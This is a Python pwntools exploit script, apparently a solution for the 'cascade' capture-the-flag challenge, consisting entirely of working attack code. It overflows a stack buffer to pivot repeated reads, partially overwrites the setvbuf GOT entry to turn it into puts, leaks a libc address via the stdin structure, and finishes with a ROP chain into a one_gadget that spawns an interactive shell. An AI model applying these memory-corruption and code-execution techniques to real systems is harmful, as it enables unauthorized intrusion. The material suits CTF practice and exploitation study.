#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "cascade.chal.imaginaryctf.org"
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000401179
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
main = exe.sym.main
setvbuf_got = exe.got.setvbuf
setvbuf_plt = exe.plt.setvbuf
read_addr = 0x401162
pop_rbp = 0x000000000040113d
stdin = 0x404030

# PAYLOAD
payload = b'\0'*0x40
payload += flat(
    0x404050 + 0x40, # saved rbp 1
    read_addr # saved rip 1
    )
# GDB()
input(b'1')
p.send(payload)

payload = flat(
    # 0x404050
    pop_rbp, # saved rip 3
    stdin + 0x40,
    read_addr,

    b'a'*8, # saved rip 4
    0x404500,
    read_addr
    )
payload = payload.ljust(0x40, b'\0')
payload += flat(
    setvbuf_got + 0x40, # saved rbp 2
    read_addr # saved rip 2
    )
input(b'2')
p.send(payload)

# Overwrite setvbuf -> puts
input(b'3')
p.send(p16(0x7be0))

# Overwrite stdin -> stdin + 8 (stdin -> 0xfbad208b)
input(b'4')
p.send(p8(0xe8))

payload = b'\0'*0x40
payload += flat(
    0x404400, # saved rbp 5
    main, # saved rip 5
    )
input(b'5')
p.send(payload)
p.recv(5)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym._IO_2_1_stdin_ - 131
log.info("Libc base: " + hex(libc.address))

gadget = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]
pop_rdi = 0x000000000010f75b + libc.address
ret = pop_rdi + 1
payload = b'a'*0x48
rop = ROP(libc)
payload += flat(
    rop.rax.address, 0, # pop rax; ret
    rop.rbx.address, 0, # pop rbx; ret
    ret,
    libc.address + gadget[0]
    )
input(b'6')
p.send(payload)

p.interactive()